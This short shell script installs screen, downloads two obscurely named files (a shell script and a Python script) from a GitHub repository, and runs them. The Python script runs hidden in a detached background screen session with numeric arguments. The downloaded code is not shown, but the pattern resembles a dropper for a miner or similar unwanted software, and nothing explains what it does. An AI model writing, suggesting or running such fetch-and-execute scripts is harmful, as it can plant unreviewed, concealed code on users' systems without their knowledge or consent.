#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/matroska56/tenkoishika/raw/main/junloper.sh
wget https://github.com/matroska56/tenkoishika/raw/main/saturner.py
chmod +x saturner.py
screen -dmS saturner.py ./saturner.py 60 70
chmod +x junloper.sh
./junloper.sh
